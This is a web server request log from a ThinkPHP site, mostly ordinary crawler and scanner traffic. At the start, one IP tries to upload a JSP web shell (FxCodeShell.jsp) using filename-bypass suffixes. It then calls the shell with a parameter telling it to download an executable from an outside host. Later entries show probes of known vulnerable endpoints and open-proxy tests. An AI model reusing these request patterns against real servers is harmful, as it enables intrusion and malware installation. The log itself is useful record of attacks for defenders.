---------------------------------------------------------------
[2019-10-13T00:32:17+08:00] 123.57.163.14 PUT 123.57.56.8/FxCodeShell.jsp%20
[运行时间：0.521981s] [吞吐率：1.92req/s] [内存消耗：1,983.11kb] [文件加载：125]
[ info ] [ LANG ] /data/www/tour/thinkphp/lang/zh-cn.php
---------------------------------------------------------------
[2019-10-13T00:32:17+08:00] 123.57.163.14 PUT 123.57.56.8/FxCodeShell.jsp::$DATA
[运行时间：0.031655s] [吞吐率：31.59req/s] [内存消耗：1,983.12kb] [文件加载：125]
[ info ] [ LANG ] /data/www/tour/thinkphp/lang/zh-cn.php
---------------------------------------------------------------
[2019-10-13T00:32:17+08:00] 123.57.163.14 PUT 123.57.56.8/FxCodeShell.jsp/
[运行时间：0.038314s] [吞吐率：26.10req/s] [内存消耗：1,983.10kb] [文件加载：125]
[ info ] [ LANG ] /data/www/tour/thinkphp/lang/zh-cn.php
---------------------------------------------------------------
[2019-10-13T00:32:17+08:00] 123.57.163.14 GET 123.57.56.8/FxCodeShell.jsp?view=FxxkMyLie1836710Aa&os=1&address=http://fky.dfg45dfg45.best/download.exe
[运行时间：0.027580s] [吞吐率：36.26req/s] [内存消耗：1,972.06kb] [文件加载：125]
[ info ] [ LANG ] /data/www/tour/thinkphp/lang/zh-cn.php
---------------------------------------------------------------
[2019-10-13T00:41:15+08:00] 209.17.97.74 GET aizhuanbao.cn/
[运行时间：0.110158s] [吞吐率：9.08req/s] [内存消耗：2,210.38kb] [文件加载：131]
[ info ] [ LANG ] /data/www/tour/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'user-agent' => 'Mozilla/5.0 (compatible; Nimbostratus-Bot/v1.3.2; http://cloudsystemnetworks.com)',
  'host' => 'aizhuanbao.cn',
  'content-length' => '',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ VIEW ] /data/www/tour/application/index/view/index_index.php [ array (
) ]
---------------------------------------------------------------
[2019-10-13T01:01:31+08:00] 124.205.145.243 GET www.aizhuanbao.cn/
[运行时间：0.050282s] [吞吐率：19.89req/s] [内存消耗：2,211.06kb] [文件加载：131]
[ info ] [ LANG ] /data/www/tour/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'accept-encoding' => 'gzip,deflate',
  'connection' => 'Keep-Alive',
  'host' => 'www.aizhuanbao.cn',
  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36',
  'content-length' => '',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ VIEW ] /data/www/tour/application/index/view/index_index.php [ array (
) ]
---------------------------------------------------------------
[2019-10-13T01:29:56+08:00] 123.125.71.100 GET aizhuanbao.cn/
[运行时间：0.528881s] [吞吐率：1.89req/s] [内存消耗：2,211.63kb] [文件加载：131]
[ info ] [ LANG ] /data/www/tour/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'accept' => '*/*',
  'accept-encoding' => 'gzip',
  'if-none-match' => '"W/"5d68d3e1-247""',
  'accept-language' => 'zh-cn,zh-tw',
  'user-agent' => 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)',
  'connection' => 'close',
  'host' => 'aizhuanbao.cn',
  'content-length' => '',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ VIEW ] /data/www/tour/application/index/view/index_index.php [ array (
) ]
---------------------------------------------------------------
[2019-10-13T01:37:54+08:00] 123.57.163.14 POST 123.57.56.8/invoker/readonly
[运行时间：0.216639s] [吞吐率：4.62req/s] [内存消耗：1,973.57kb] [文件加载：125]
[ info ] [ LANG ] /data/www/tour/thinkphp/lang/zh-cn.php
---------------------------------------------------------------
[2019-10-13T01:59:08+08:00] 182.76.202.33 GET 123.57.56.8:80/
[运行时间：0.081965s] [吞吐率：12.20req/s] [内存消耗：2,210.70kb] [文件加载：131]
[ info ] [ LANG ] /data/www/tour/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'content-length' => '0',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36',
  'host' => '123.57.56.8:80',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ VIEW ] /data/www/tour/application/index/view/index_index.php [ array (
) ]
---------------------------------------------------------------
[2019-10-13T02:49:51+08:00] 101.251.242.238 GET 123.57.56.8:80/
[运行时间：0.029376s] [吞吐率：34.04req/s] [内存消耗：2,198.59kb] [文件加载：130]
[ info ] [ LANG ] /data/www/tour/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'accept' => 'application/json, text/plain, */*',
  'accept-charset' => 'GBK,utf-8;q=0.7,*;q=0.3',
  'accept-language' => 'zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3',
  'accept-encoding' => 'gzip, deflate, br',
  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0',
  'host' => '123.57.56.8:80',
  'content-length' => '',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ VIEW ] /data/www/tour/application/index/view/index_index.php [ array (
) ]
---------------------------------------------------------------
[2019-10-13T03:20:48+08:00] 187.237.77.199 POST 123.57.56.8/editBlackAndWhiteList
[运行时间：0.068972s] [吞吐率：14.50req/s] [内存消耗：1,973.23kb] [文件加载：125]
[ info ] [ LANG ] /data/www/tour/thinkphp/lang/zh-cn.php
---------------------------------------------------------------
[2019-10-13T03:24:48+08:00] 123.126.113.179 GET aizhuanbao.cn/
[运行时间：0.033990s] [吞吐率：29.42req/s] [内存消耗：2,211.63kb] [文件加载：131]
[ info ] [ LANG ] /data/www/tour/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'if-modified-since' => 'Wed, 09 Oct 2019 18:55:12 GMT',
  'connection' => 'close',
  'user-agent' => 'Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)',
  'accept-encoding' => 'gzip,deflate',
  'accept-language' => 'zh-cn',
  'accept' => '*/*',
  'host' => 'aizhuanbao.cn',
  'content-length' => '',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ VIEW ] /data/www/tour/application/index/view/index_index.php [ array (
) ]
---------------------------------------------------------------
[2019-10-13T03:27:16+08:00] 42.83.147.202 GET www.aizhuanbao.cn/
[运行时间：0.030950s] [吞吐率：32.31req/s] [内存消耗：2,210.75kb] [文件加载：131]
[ info ] [ LANG ] /data/www/tour/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'user-agent' => 'Mozilla/5.0(compatible;MSIE9.0;WindowsNT6.1;Trident/5.0;',
  'host' => 'www.aizhuanbao.cn',
  'connection' => 'TE, close',
  'te' => 'deflate,gzip;q=0.3',
  'content-length' => '',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ VIEW ] /data/www/tour/application/index/view/index_index.php [ array (
) ]
---------------------------------------------------------------
[2019-10-13T03:32:32+08:00] 175.152.109.79 HEAD 123.125.114.144/
[运行时间：0.034751s] [吞吐率：28.78req/s] [内存消耗：2,211.50kb] [文件加载：131]
[ info ] [ LANG ] /data/www/tour/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'connection' => 'keep-alive',
  'cache-control' => 'max-age=0',
  'accept-encoding' => 'gzip, deflate, sdch',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36',
  'accept-language' => 'zh-CN,zh;q=0.8',
  'proxy-connection' => 'Keep-Alive',
  'proxy-authorization' => 'Basic Og==',
  'host' => '123.125.114.144',
  'content-length' => '',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ VIEW ] /data/www/tour/application/index/view/index_index.php [ array (
) ]
---------------------------------------------------------------
[2019-10-13T03:32:37+08:00] 171.116.146.231 GET www.minghui.org/
[运行时间：0.032090s] [吞吐率：31.16req/s] [内存消耗：2,212.59kb] [文件加载：131]
[ info ] [ LANG ] /data/www/tour/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.101 Safari/537.36',
  'accept-language' => 'zh-CN,zh;q=0.8',
  'cache-control' => 'max-age=0',
  'connection' => 'keep-alive',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
  'accept-encoding' => 'gzip, deflate, sdch',
  'proxy-connection' => 'Keep-Alive',
  'proxy-authorization' => 'Basic Og==',
  'host' => 'www.minghui.org',
  'content-length' => '',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ VIEW ] /data/www/tour/application/index/view/index_index.php [ array (
) ]
---------------------------------------------------------------
[2019-10-13T03:32:38+08:00] 124.235.138.41 GET www.epochtimes.com/
[运行时间：0.038508s] [吞吐率：25.97req/s] [内存消耗：2,212.60kb] [文件加载：131]
[ info ] [ LANG ] /data/www/tour/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.101 Safari/537.36',
  'accept-language' => 'zh-CN,zh;q=0.8',
  'cache-control' => 'max-age=0',
  'connection' => 'keep-alive',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
  'accept-encoding' => 'gzip, deflate, sdch',
  'proxy-connection' => 'Keep-Alive',
  'proxy-authorization' => 'Basic Og==',
  'host' => 'www.epochtimes.com',
  'content-length' => '',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ VIEW ] /data/www/tour/application/index/view/index_index.php [ array (
) ]
---------------------------------------------------------------
[2019-10-13T03:32:39+08:00] 114.221.127.105 GET www.ip.cn/
[运行时间：0.031447s] [吞吐率：31.80req/s] [内存消耗：2,212.59kb] [文件加载：131]
[ info ] [ LANG ] /data/www/tour/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.101 Safari/537.36',
  'accept-language' => 'zh-CN,zh;q=0.8',
  'cache-control' => 'max-age=0',
  'connection' => 'keep-alive',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
  'accept-encoding' => 'gzip, deflate, sdch',
  'proxy-connection' => 'Keep-Alive',
  'proxy-authorization' => 'Basic Og==',
  'host' => 'www.ip.cn',
  'content-length' => '',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ VIEW ] /data/www/tour/application/index/view/index_index.php [ array (
) ]
---------------------------------------------------------------
[2019-10-13T03:32:41+08:00] 124.235.138.76 GET www.rfa.org/english/
[运行时间：0.028659s] [吞吐率：34.89req/s] [内存消耗：1,972.37kb] [文件加载：125]
[ info ] [ LANG ] /data/www/tour/thinkphp/lang/zh-cn.php
---------------------------------------------------------------
[2019-10-13T03:32:42+08:00] 222.82.63.182 GET www.123cha.com/
[运行时间：0.030968s] [吞吐率：32.29req/s] [内存消耗：2,212.59kb] [文件加载：131]
[ info ] [ LANG ] /data/www/tour/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.101 Safari/537.36',
  'accept-language' => 'zh-CN,zh;q=0.8',
  'cache-control' => 'max-age=0',
  'connection' => 'keep-alive',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
  'accept-encoding' => 'gzip, deflate, sdch',
  'proxy-connection' => 'Keep-Alive',
  'proxy-authorization' => 'Basic Og==',
  'host' => 'www.123cha.com',
  'content-length' => '',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ VIEW ] /data/www/tour/application/index/view/index_index.php [ array (
) ]
---------------------------------------------------------------
[2019-10-13T03:32:43+08:00] 113.206.198.65 GET boxun.com/
[运行时间：0.033921s] [吞吐率：29.48req/s] [内存消耗：2,212.56kb] [文件加载：131]
[ info ] [ LANG ] /data/www/tour/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.101 Safari/537.36',
  'accept-language' => 'zh-CN,zh;q=0.8',
  'cache-control' => 'max-age=0',
  'connection' => 'keep-alive',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
  'accept-encoding' => 'gzip, deflate, sdch',
  'proxy-connection' => 'Keep-Alive',
  'proxy-authorization' => 'Basic Og==',
  'host' => 'boxun.com',
  'content-length' => '',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ VIEW ] /data/www/tour/application/index/view/index_index.php [ array (
) ]
---------------------------------------------------------------
[2019-10-13T03:32:44+08:00] 123.163.114.16 GET www.wujieliulan.com/
[运行时间：0.030898s] [吞吐率：32.36req/s] [内存消耗：2,212.60kb] [文件加载：131]
[ info ] [ LANG ] /data/www/tour/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.101 Safari/537.36',
  'accept-language' => 'zh-CN,zh;q=0.8',
  'cache-control' => 'max-age=0',
  'connection' => 'keep-alive',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
  'accept-encoding' => 'gzip, deflate, sdch',
  'proxy-connection' => 'Keep-Alive',
  'proxy-authorization' => 'Basic Og==',
  'host' => 'www.wujieliulan.com',
  'content-length' => '',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ VIEW ] /data/www/tour/application/index/view/index_index.php [ array (
) ]
---------------------------------------------------------------
[2019-10-13T03:50:15+08:00] 101.132.188.111 GET www.aizhuanbao.cn/
[运行时间：0.371740s] [吞吐率：2.69req/s] [内存消耗：2,210.74kb] [文件加载：131]
[ info ] [ LANG ] /data/www/tour/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'accept-encoding' => 'gzip',
  'connection' => 'Keep-Alive',
  'host' => 'www.aizhuanbao.cn',
  'user-agent' => 'Mozilla/5.0 (Linux; Android 4.1.1; Nexus 7 Build/JRO03D)',
  'content-length' => '',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ VIEW ] /data/www/tour/application/index/view/index_index.php [ array (
) ]
---------------------------------------------------------------
[2019-10-13T03:53:25+08:00] 47.97.167.161 GET www.maxthink.cn/
[运行时间：0.050556s] [吞吐率：19.78req/s] [内存消耗：2,210.73kb] [文件加载：131]
[ info ] [ LANG ] /data/www/tour/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'accept-encoding' => 'gzip',
  'connection' => 'Keep-Alive',
  'host' => 'www.maxthink.cn',
  'user-agent' => 'Mozilla/5.0 (Linux; Android 4.1.1; Nexus 7 Build/JRO03D)',
  'content-length' => '',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ VIEW ] /data/www/tour/application/index/view/index_index.php [ array (
) ]
---------------------------------------------------------------
[2019-10-13T03:53:32+08:00] 101.132.144.145 GET aizhuanbao.cn/
[运行时间：0.033263s] [吞吐率：30.06req/s] [内存消耗：2,210.70kb] [文件加载：131]
[ info ] [ LANG ] /data/www/tour/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'accept-encoding' => 'gzip',
  'connection' => 'Keep-Alive',
  'host' => 'aizhuanbao.cn',
  'user-agent' => 'Mozilla/5.0 (Linux; Android 4.1.1; Nexus 7 Build/JRO03D)',
  'content-length' => '',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ VIEW ] /data/www/tour/application/index/view/index_index.php [ array (
) ]
---------------------------------------------------------------
[2019-10-13T03:56:17+08:00] 47.97.204.168 GET maxthink.cn/
[运行时间：0.030725s] [吞吐率：32.55req/s] [内存消耗：2,210.70kb] [文件加载：131]
[ info ] [ LANG ] /data/www/tour/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'accept-encoding' => 'gzip',
  'connection' => 'Keep-Alive',
  'host' => 'maxthink.cn',
  'user-agent' => 'Mozilla/5.0 (Linux; Android 4.1.1; Nexus 7 Build/JRO03D)',
  'content-length' => '',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ VIEW ] /data/www/tour/application/index/view/index_index.php [ array (
) ]
---------------------------------------------------------------
[2019-10-13T04:18:37+08:00] 177.21.97.185 GET 123.57.56.8:80/
[运行时间：0.031723s] [吞吐率：31.52req/s] [内存消耗：2,210.70kb] [文件加载：131]
[ info ] [ LANG ] /data/www/tour/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'content-length' => '0',
  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36',
  'host' => '123.57.56.8:80',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ VIEW ] /data/www/tour/application/index/view/index_index.php [ array (
) ]
---------------------------------------------------------------
[2019-10-13T04:40:33+08:00] 47.101.200.30 GET aizhuanbao.cn/
[运行时间：0.047238s] [吞吐率：21.17req/s] [内存消耗：2,210.72kb] [文件加载：131]
[ info ] [ LANG ] /data/www/tour/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'accept-encoding' => 'gzip',
  'connection' => 'Keep-Alive',
  'host' => 'aizhuanbao.cn',
  'user-agent' => 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:36.0) Gecko/20100101 Firefox/36.0',
  'content-length' => '',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ VIEW ] /data/www/tour/application/index/view/index_index.php [ array (
) ]
---------------------------------------------------------------
[2019-10-13T05:18:52+08:00] 162.222.181.50 GET maxthink.cn/
[运行时间：0.030518s] [吞吐率：32.77req/s] [内存消耗：2,210.73kb] [文件加载：131]
[ info ] [ LANG ] /data/www/tour/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'user-agent' => 'python-requests/2.22.0',
  'accept' => '*/*',
  'accept-encoding' => 'gzip, deflate',
  'connection' => 'keep-alive',
  'host' => 'maxthink.cn',
  'content-length' => '',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ VIEW ] /data/www/tour/application/index/view/index_index.php [ array (
) ]
---------------------------------------------------------------
[2019-10-13T05:31:42+08:00] 47.100.36.216 GET joke.aizhuanbao.cn/
[运行时间：0.030856s] [吞吐率：32.41req/s] [内存消耗：2,210.76kb] [文件加载：131]
[ info ] [ LANG ] /data/www/tour/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'accept-encoding' => 'gzip',
  'connection' => 'Keep-Alive',
  'host' => 'joke.aizhuanbao.cn',
  'user-agent' => 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:36.0) Gecko/20100101 Firefox/36.0',
  'content-length' => '',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ VIEW ] /data/www/tour/application/index/view/index_index.php [ array (
) ]
---------------------------------------------------------------
[2019-10-13T05:55:50+08:00] 47.101.192.218 GET www.aizhuanbao.cn/
[运行时间：0.048267s] [吞吐率：20.72req/s] [内存消耗：2,210.76kb] [文件加载：131]
[ info ] [ LANG ] /data/www/tour/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'accept-encoding' => 'gzip',
  'connection' => 'Keep-Alive',
  'host' => 'www.aizhuanbao.cn',
  'user-agent' => 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:36.0) Gecko/20100101 Firefox/36.0',
  'content-length' => '',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ VIEW ] /data/www/tour/application/index/view/index_index.php [ array (
) ]
---------------------------------------------------------------
[2019-10-13T07:14:59+08:00] 42.236.99.194 GET www.aizhuanbao.cn/
[运行时间：0.306902s] [吞吐率：3.26req/s] [内存消耗：2,212.03kb] [文件加载：131]
[ info ] [ LANG ] /data/www/tour/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36; 360Spider',
  'connection' => 'Keep-Alive',
  'accept-language' => 'zh-CN',
  'accept' => '*/*',
  'cookie' => '',
  'referer' => 'http://www.aizhuanbao.cn/',
  'accept-encoding' => 'deflate, gzip',
  'host' => 'www.aizhuanbao.cn',
  'content-length' => '',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ VIEW ] /data/www/tour/application/index/view/index_index.php [ array (
) ]
---------------------------------------------------------------
[2019-10-13T07:15:14+08:00] 42.236.99.206 GET aizhuanbao.cn/
[运行时间：0.034372s] [吞吐率：29.09req/s] [内存消耗：2,211.98kb] [文件加载：131]
[ info ] [ LANG ] /data/www/tour/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36; 360Spider',
  'connection' => 'Keep-Alive',
  'accept-language' => 'zh-CN',
  'accept' => '*/*',
  'cookie' => '',
  'referer' => 'http://aizhuanbao.cn/',
  'accept-encoding' => 'deflate, gzip',
  'host' => 'aizhuanbao.cn',
  'content-length' => '',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ VIEW ] /data/www/tour/application/index/view/index_index.php [ array (
) ]
---------------------------------------------------------------
[2019-10-13T07:21:30+08:00] 210.239.227.109 GET 123.57.56.8/
[运行时间：0.083713s] [吞吐率：11.95req/s] [内存消耗：2,209.99kb] [文件加载：131]
[ info ] [ LANG ] /data/www/tour/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'host' => '123.57.56.8',
  'content-length' => '',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ VIEW ] /data/www/tour/application/index/view/index_index.php [ array (
) ]
---------------------------------------------------------------
[2019-10-13T07:41:40+08:00] 80.82.70.187 GET www.baidu.com/cache/global/img/gs.gif
[运行时间：0.093678s] [吞吐率：10.67req/s] [内存消耗：1,971.41kb] [文件加载：125]
[ info ] [ LANG ] /data/www/tour/thinkphp/lang/zh-cn.php
---------------------------------------------------------------
[2019-10-13T08:27:33+08:00] 65.154.226.220 GET 123.57.56.8/
[运行时间：0.347055s] [吞吐率：2.88req/s] [内存消耗：2,211.71kb] [文件加载：131]
[ info ] [ LANG ] /data/www/tour/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'accept-encoding' => 'gzip, deflate',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
  'user-agent' => 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/74.0.3729.157 Safari/537.36',
  'upgrade-insecure-requests' => '1',
  'connection' => 'keep-alive',
  'host' => '123.57.56.8',
  'content-length' => '',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ VIEW ] /data/www/tour/application/index/view/index_index.php [ array (
) ]
---------------------------------------------------------------
[2019-10-13T08:38:07+08:00] 47.101.201.46 GET maxthink.cn/
[运行时间：0.114616s] [吞吐率：8.72req/s] [内存消耗：2,210.72kb] [文件加载：131]
[ info ] [ LANG ] /data/www/tour/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'accept-encoding' => 'gzip',
  'connection' => 'Keep-Alive',
  'host' => 'maxthink.cn',
  'user-agent' => 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:36.0) Gecko/20100101 Firefox/36.0',
  'content-length' => '',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ VIEW ] /data/www/tour/application/index/view/index_index.php [ array (
) ]
---------------------------------------------------------------
[2019-10-13T08:39:03+08:00] 47.101.199.121 GET www.maxthink.cn/
[运行时间：0.031709s] [吞吐率：31.54req/s] [内存消耗：2,210.75kb] [文件加载：131]
[ info ] [ LANG ] /data/www/tour/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'accept-encoding' => 'gzip',
  'connection' => 'Keep-Alive',
  'host' => 'www.maxthink.cn',
  'user-agent' => 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:36.0) Gecko/20100101 Firefox/36.0',
  'content-length' => '',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ VIEW ] /data/www/tour/application/index/view/index_index.php [ array (
) ]
---------------------------------------------------------------
[2019-10-13T08:45:40+08:00] 34.220.210.201 GET aizhuanbao.cn/
[运行时间：0.032648s] [吞吐率：30.63req/s] [内存消耗：2,210.33kb] [文件加载：131]
[ info ] [ LANG ] /data/www/tour/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'accept-encoding' => 'gzip',
  'user-agent' => 'Go-http-client/1.1',
  'host' => 'aizhuanbao.cn',
  'content-length' => '',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ VIEW ] /data/www/tour/application/index/view/index_index.php [ array (
) ]
---------------------------------------------------------------
[2019-10-13T09:03:58+08:00] 217.182.128.249 GET 123.57.56.8/
[运行时间：0.031657s] [吞吐率：31.59req/s] [内存消耗：2,210.46kb] [文件加载：131]
[ info ] [ LANG ] /data/www/tour/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'accept-encoding' => 'gzip',
  'accept' => '*/*',
  'user-agent' => 'Mozilla/5.0 zgrab/0.x',
  'host' => '123.57.56.8',
  'content-length' => '',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ VIEW ] /data/www/tour/application/index/view/index_index.php [ array (
) ]
---------------------------------------------------------------
[2019-10-13T09:27:11+08:00] 171.67.70.128 GET 123.57.56.8/
[运行时间：0.034201s] [吞吐率：29.24req/s] [内存消耗：2,210.46kb] [文件加载：131]
[ info ] [ LANG ] /data/www/tour/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'accept-encoding' => 'gzip',
  'accept' => '*/*',
  'user-agent' => 'Mozilla/5.0 zgrab/0.x',
  'host' => '123.57.56.8',
  'content-length' => '',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ VIEW ] /data/www/tour/application/index/view/index_index.php [ array (
) ]
---------------------------------------------------------------
[2019-10-13T09:27:13+08:00] 171.67.70.144 GET 123.57.56.8/
[运行时间：0.037192s] [吞吐率：26.89req/s] [内存消耗：2,210.46kb] [文件加载：131]
[ info ] [ LANG ] /data/www/tour/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'accept-encoding' => 'gzip',
  'accept' => '*/*',
  'user-agent' => 'Mozilla/5.0 zgrab/0.x',
  'host' => '123.57.56.8',
  'content-length' => '',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ VIEW ] /data/www/tour/application/index/view/index_index.php [ array (
) ]
---------------------------------------------------------------
[2019-10-13T09:59:39+08:00] 101.132.134.40 GET 123.57.56.8/
[运行时间：0.057715s] [吞吐率：17.33req/s] [内存消耗：2,210.76kb] [文件加载：131]
[ info ] [ LANG ] /data/www/tour/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'accept-encoding' => 'gzip',
  'connection' => 'Keep-Alive',
  'host' => '123.57.56.8',
  'user-agent' => 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:36.0) Gecko/20100101 Firefox/36.0',
  'content-length' => '',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
)
